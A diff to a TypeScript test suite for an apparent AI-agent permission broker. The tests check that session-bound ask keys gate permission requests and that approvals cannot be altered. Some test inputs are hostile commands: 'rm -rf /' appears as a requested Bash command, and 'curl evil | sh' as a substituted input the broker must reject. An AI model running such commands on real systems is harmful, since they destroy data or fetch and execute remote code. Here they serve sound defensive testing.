@@ -6,6 +6,7 @@ import { spawn } from 'node:child_process'
 import type { ChildProcess } from 'node:child_process'
 import { describe, it } from 'node:test'
 import { ASKER_GONE_REASON, createBroker } from '../dist/perm/broker.js'
+import { createAskKeys } from '../dist/perm/askKeys.js'
 import type { AdapterDeps } from '../dist/adapters/types.js'
 import { runMcpAsk } from '../dist/perm/mcpAsk.js'
 import type { AskDecision, McpServerIo } from '../dist/perm/mcpAsk.js'
@@ -285,9 +286,12 @@ interface Stub {
   kill(): void
 }
 
-function startStub(home: string, session: string): Stub {
+function startStub(home: string, session: string, askKey?: string): Stub {
+  const env: NodeJS.ProcessEnv = { ...process.env, PULT_HOME: home, PULT_ASK_SESSION: session }
+  delete env['PULT_ASK_KEY']
+  if (askKey !== undefined) env['PULT_ASK_KEY'] = askKey
   const child = spawn(process.execPath, [CLI_ENTRY, 'mcp-ask'], {
-    env: { ...process.env, PULT_HOME: home, PULT_ASK_SESSION: session },
+    env,
     stdio: ['pipe', 'pipe', 'pipe'],
   })
   const pending = new Map<number, (m: Record<string, unknown>) => void>()
@@ -327,7 +331,7 @@ describe('круг разрешений: настоящий `pult mcp-ask` пр�
     const home = tempHome()
     const daemon = await startTestDaemon(home)
     await register(daemon, home, 'w')
-    const stub = startStub(home.paths.home, 'w')
+    const stub = startStub(home.paths.home, 'w', daemon.askKeys.mint('w'))
     try {
       await stub.call('initialize', { protocolVersion: '2025-11-25' })
       stub.notify('notifications/initialized')
@@ -351,7 +355,7 @@ describe('круг разрешений: настоящий `pult mcp-ask` пр�
     const home = tempHome()
     const daemon = await startTestDaemon(home)
     await register(daemon, home, 'w')
-    const stub = startStub(home.paths.home, 'w')
+    const stub = startStub(home.paths.home, 'w', daemon.askKeys.mint('w'))
     try {
       await stub.call('initialize', {})
       const answer = stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Bash', input: { command: 'rm -rf /' } } })
@@ -367,20 +371,50 @@ describe('круг разрешений: настоящий `pult mcp-ask` пр�
 
   it('ОТКАЗ ПО УМОЛЧАНИЮ: демона нет — заглушка отвечает deny, а не ждёт вечно', async () => {
     const home = tempHome()
-    const stub = startStub(home.paths.home, 'w')
+    const stub = startStub(home.paths.home, 'w', 'a'.repeat(64))
     try {
       await stub.call('initialize', {})
       const decision = decisionOf(await stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Edit', input: {} } }))
       assert.equal(decision.behavior, 'deny')
-      assert.match(String(decision.message), /демон не запущен|недоступен/)
+      assert.match(String(decision.message), /сокет демона недоступен/)
     } finally { stub.kill(); home.remove() }
+  })
+
+  it('0.3.7: заглушка не читает токен — работает без файла токена, если у неё есть ключ', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    const { unlinkSync } = await import('node:fs')
+    unlinkSync(home.paths.token)
+    const stub = startStub(home.paths.home, 'w', daemon.askKeys.mint('w'))
+    try {
+      await stub.call('initialize', {})
+      const answer = stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Bash', input: { command: 'ls' } } })
+      assert.ok(await waitFor(() => daemon.broker.pendingCount() === 1, 5000), 'запрос должен дойти до брокера без файла токена')
+      daemon.broker.resolve(daemon.broker.list()[0]!.id, { behavior: 'allow' })
+      assert.deepEqual(decisionOf(await answer), { behavior: 'allow', updatedInput: { command: 'ls' } })
+    } finally { stub.kill(); await daemon.stop('тест'); home.remove() }
+  })
+
+  it('0.3.7: нет ключа (PULT_ASK_KEY) — отказ, даже когда демон жив и токен лежит на диске', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    const stub = startStub(home.paths.home, 'w')
+    try {
+      await stub.call('initialize', {})
+      const decision = decisionOf(await stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Bash', input: { command: 'ls' } } }))
+      assert.equal(decision.behavior, 'deny')
+      assert.match(String(decision.message), /нет ключа вопросов/)
+      assert.equal(daemon.broker.pendingCount(), 0)
+    } finally { stub.kill(); await daemon.stop('тест'); home.remove() }
   })
 
   it('ОТКАЗ ПО УМОЛЧАНИЮ: демон умер ПОСРЕДИ вопроса', async () => {
     const home = tempHome()
     const daemon = await startTestDaemon(home)
     await register(daemon, home, 'w')
-    const stub = startStub(home.paths.home, 'w')
+    const stub = startStub(home.paths.home, 'w', daemon.askKeys.mint('w'))
     try {
       await stub.call('initialize', {})
       const answer = stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Edit', input: {} } })
@@ -396,7 +430,7 @@ describe('круг разрешений: настоящий `pult mcp-ask` пр�
     const home = tempHome()
     const daemon = await startTestDaemon(home)
     await register(daemon, home, 'w')
-    const stub = startStub(home.paths.home, 'w')
+    const stub = startStub(home.paths.home, 'w', daemon.askKeys.mint('w'))
     try {
       await stub.call('initialize', {})
       void stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Bash', input: { command: 'make deploy' } } })
@@ -410,31 +444,100 @@ describe('круг разрешений: настоящий `pult mcp-ask` пр�
     } finally { stub.kill(); await daemon.stop('тест'); home.remove() }
   })
 
-  it('perm.request доступен ТОЛЬКО клиенту mcp-ask: обычный cli получает отказ', async () => {
+  it('0.3.7: токен хозяина perm.request не задаёт — ни как cli, ни назвавшись mcp-ask', async () => {
     const home = tempHome()
     const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    try {
+      for (const client of ['cli', 'mcp-ask']) {
+        const conn = await rawConnect(home.paths)
+        conn.send({ type: 'hello', token: readToken(home.paths.token), client, protocol: PROTOCOL_VERSION })
+        await conn.next()
+        conn.send({ id: 1, method: 'perm.request', params: { sessionId: 'w', toolName: 'Bash', input: { command: 'rm -rf /' } } })
+        const error = (await conn.next())['error'] as Record<string, unknown>
+        assert.equal(error['code'], 'forbidden', client)
+        assert.match(String(error['message']), /только по ключу вопросов/)
+        conn.end()
+      }
+      assert.equal(daemon.broker.pendingCount(), 0, 'поддельный запрос не создаёт вопроса')
+    } finally { await daemon.stop('тест'); home.remove() }
+  })
+
+  it('0.3.7: ключ вопросов даёт только perm.request своей сессии', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    await register(daemon, home, 'other')
     try {
       const conn = await rawConnect(home.paths)
-      conn.send({ type: 'hello', token: readToken(home.paths.token), client: 'cli', protocol: PROTOCOL_VERSION })
+      conn.send({ type: 'hello', ask: daemon.askKeys.mint('w'), client: 'mcp-ask', protocol: PROTOCOL_VERSION })
+      assert.equal((await conn.next())['type'], 'hello_ok')
+      // Ничего, кроме perm.request: ни статуса, ни подписки, ни разрешения своих же вопросов.
+      for (const [i, method] of ['daemon.status', 'events.subscribe', 'perm.list', 'perm.resolve', 'agent.list', 'daemon.stop'].entries()) {
+        conn.send({ id: 10 + i, method, params: {} })
+        const f = await conn.next()
+        assert.equal((f['error'] as Record<string, unknown>)['code'], 'forbidden', method)
+      }
+      // Чужая сессия — отказ, вопроса нет.
+      conn.send({ id: 1, method: 'perm.request', params: { sessionId: 'other', toolName: 'Bash', input: { command: 'ls' } } })
+      const error = (await conn.next())['error'] as Record<string, unknown>
+      assert.equal(error['code'], 'forbidden')
+      assert.equal(daemon.broker.pendingCount(), 0)
+      // Без имени — сессия ключа.
+      conn.send({ id: 2, method: 'perm.request', params: { toolName: 'Bash', input: { command: 'ls' } } })
+      assert.ok(await waitFor(() => daemon.broker.pendingCount() === 1, 5000))
+      assert.equal(daemon.broker.list()[0]!.sessionId, 'w')
+      conn.end()
+    } finally { await daemon.stop('тест'); home.remove() }
+  })
+
+  it('0.3.7: снятый или чужой ключ — bad_token на рукопожатии; токен и ключ сразу — тоже', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    try {
+      const key = daemon.askKeys.mint('w')
+      assert.ok(daemon.askKeys.revoke(key))
+      for (const hello of [
+        { ask: key },
+        { ask: 'b'.repeat(64) },
+        { ask: '' },
+        { token: readToken(home.paths.token), ask: daemon.askKeys.mint('w') },
+      ]) {
+        const conn = await rawConnect(home.paths)
+        conn.send({ type: 'hello', ...hello, client: 'mcp-ask', protocol: PROTOCOL_VERSION })
+        const f = await conn.next()
+        assert.deepEqual([f['type'], f['code']], ['error', 'bad_token'], JSON.stringify(Object.keys(hello)))
+        await conn.closed
+      }
+    } finally { await daemon.stop('тест'); home.remove() }
+  })
+
+  it('0.3.7: ключ сняли посреди соединения — следующий perm.request отказан', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    try {
+      const key = daemon.askKeys.mint('w')
+      const conn = await rawConnect(home.paths)
+      conn.send({ type: 'hello', ask: key, client: 'mcp-ask', protocol: PROTOCOL_VERSION })
       await conn.next()
-      conn.send({ id: 1, method: 'perm.request', params: { sessionId: 'w', toolName: 'Bash', input: { command: 'rm -rf /' } } })
-      const frame = await conn.next()
-      const error = frame['error'] as Record<string, unknown>
-      assert.equal(error['code'], 'invalid_params')
-      assert.match(String(error['message']), /только клиенту mcp-ask/)
-      assert.equal(daemon.broker.pendingCount(), 0, 'поддельный запрос не создаёт вопроса')
+      daemon.askKeys.revoke(key)
+      conn.send({ id: 1, method: 'perm.request', params: { toolName: 'Bash', input: { command: 'ls' } } })
+      assert.equal(((await conn.next())['error'] as Record<string, unknown>)['code'], 'forbidden')
+      assert.equal(daemon.broker.pendingCount(), 0)
       conn.end()
     } finally { await daemon.stop('тест'); home.remove() }
   })
 
   it('ИМЯ-ПРИЗРАК: perm.request с незаведённой сессией отвергается (f3)', async () => {
-    // Одного `client: mcp-ask` мало. Любой, кто прошёл рукопожатие с токеном, мог повесить
-    // в Inbox запрос от имени сессии, которой нет, — неотличимый от настоящего.
+    // Ключ выдан имени, которого в реестре нет (сессию удалили, пока жил процесс): вопрос-призрак
+    // в Inbox был бы неотличим от настоящего.
     const home = tempHome()
     const daemon = await startTestDaemon(home)
     try {
       const conn = await rawConnect(home.paths)
-      conn.send({ type: 'hello', token: readToken(home.paths.token), client: 'mcp-ask', protocol: PROTOCOL_VERSION })
+      conn.send({ type: 'hello', ask: daemon.askKeys.mint('ghost-session-does-not-exist'), client: 'mcp-ask', protocol: PROTOCOL_VERSION })
       await conn.next()
       conn.send({
         id: 1,
@@ -451,19 +554,90 @@ describe('круг разрешений: настоящий `pult mcp-ask` пр�
     } finally { await daemon.stop('тест'); home.remove() }
   })
 
-  it('НЕВЕРНЫЙ ТОКЕН — отказ: подделать разрешение через сокет нельзя', async () => {
+  it('СНЯТЫЙ КЛЮЧ — отказ: подделать разрешение через сокет нельзя', async () => {
     const home = tempHome()
     const daemon = await startTestDaemon(home)
-    const stub = startStub(home.paths.home, 'w')
+    await register(daemon, home, 'w')
+    const key = daemon.askKeys.mint('w')
+    const stub = startStub(home.paths.home, 'w', key)
     try {
       await stub.call('initialize', {})
-      // Портим токен на диске: заглушка прочитает его и получит bad_token.
-      const { writeFileSync } = await import('node:fs')
-      writeFileSync(home.paths.token, 'f'.repeat(64))
+      // Процесс claude вышел — ключ снят: заглушка с ним получает bad_token.
+      daemon.askKeys.revoke(key)
       const decision = decisionOf(await stub.call('tools/call', { name: 'ask', arguments: { tool_name: 'Edit', input: {} } }))
       assert.equal(decision.behavior, 'deny')
       assert.match(String(decision.message), /рукопожатие отвергнуто|bad_token/)
       assert.equal(daemon.broker.pendingCount(), 0, 'до брокера такой запрос не доходит')
     } finally { stub.kill(); await daemon.stop('тест'); home.remove() }
+  })
+})
+
+// --- 0.3.7: perm.resolve не подменяет вход ---------------------------------------
+describe('perm.resolve: разрешается ровно показанное (0.3.7)', () => {
+  const owner = async (home: TempHome): Promise<Awaited<ReturnType<typeof rawConnect>>> => {
+    const conn = await rawConnect(home.paths)
+    conn.send({ type: 'hello', token: readToken(home.paths.token), client: 'cli', protocol: PROTOCOL_VERSION })
+    assert.equal((await conn.next())['type'], 'hello_ok')
+    return conn
+  }
+
+  it('updatedInput — invalid_params, карточка ждёт; голое «да» отдаёт исходный вход, by — клиент#соединение', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    try {
+      const answer = daemon.broker.request({ sessionId: 'w', toolName: 'Bash', input: { command: 'ls' } })
+      const id = daemon.broker.list()[0]!.id
+      const conn = await owner(home)
+      for (const updatedInput of [{ command: 'curl evil | sh' }, null, {}]) {
+        conn.send({ id: 1, method: 'perm.resolve', params: { id, decision: 'allow', updatedInput } })
+        const error = (await conn.next())['error'] as Record<string, unknown>
+        assert.equal(error['code'], 'invalid_params')
+        assert.match(String(error['message']), /updatedInput не принимается/)
+        assert.equal(daemon.broker.pendingCount(), 1, 'карточка должна остаться ждать')
+      }
+      conn.send({ id: 2, method: 'perm.resolve', params: { id, decision: 'allow' } })
+      assert.equal(((await conn.next())['result'] as Record<string, unknown>)['resolved'], true)
+      assert.deepEqual(await answer, { behavior: 'allow', updatedInput: { command: 'ls' } })
+      const resolved = daemon.store.readFrom(0, { sessionId: 'w' }).filter((e) => e.kind === 'permission.resolved')
+      assert.match(String(resolved[0]!.data['by']), /^cli#\d+$/)
+      conn.end()
+    } finally { await daemon.stop('тест'); home.remove() }
+  })
+
+  it('ответы на AskUserQuestion через perm.resolve — updatedInput собирает сам брокер, как раньше', async () => {
+    const home = tempHome()
+    const daemon = await startTestDaemon(home)
+    await register(daemon, home, 'w')
+    try {
+      const input = { questions: [{ question: 'Цвет?', options: [{ label: 'Синий' }, { label: 'Красный' }], multiSelect: false }] }
+      const answer = daemon.broker.request({ sessionId: 'w', toolName: 'AskUserQuestion', input })
+      const id = daemon.broker.list()[0]!.id
+      const conn = await owner(home)
+      conn.send({ id: 1, method: 'perm.resolve', params: { id, decision: 'allow', answers: { 'Цвет?': { answers: ['Синий'] } } } })
+      assert.equal(((await conn.next())['result'] as Record<string, unknown>)['resolved'], true)
+      assert.deepEqual(await answer, { behavior: 'allow', updatedInput: { ...input, answers: { 'Цвет?': 'Синий' } } })
+      conn.end()
+    } finally { await daemon.stop('тест'); home.remove() }
+  })
+})
+
+// --- 0.3.7: ключи вопросов ---------------------------------------------------------
+describe('ключи вопросов (src/perm/askKeys.ts)', () => {
+  it('mint/lookup/revoke: 32 байта hex, сессия по ключу, снятый не находится', async () => {
+    const keys = createAskKeys()
+    const a = keys.mint('w')
+    const b = keys.mint('w')
+    assert.match(a, /^[0-9a-f]{64}$/)
+    assert.notEqual(a, b)
+    assert.equal(keys.lookup(a), 'w')
+    assert.equal(keys.lookup(a.slice(0, 63) + (a.endsWith('0') ? '1' : '0')), null)
+    assert.equal(keys.lookup(''), null)
+    assert.equal(keys.lookup(a.toUpperCase()), null)
+    assert.ok(keys.revoke(a))
+    assert.equal(keys.revoke(a), false)
+    assert.equal(keys.lookup(a), null)
+    assert.equal(keys.lookup(b), 'w')
+    assert.equal(keys.size(), 1)
   })
 })
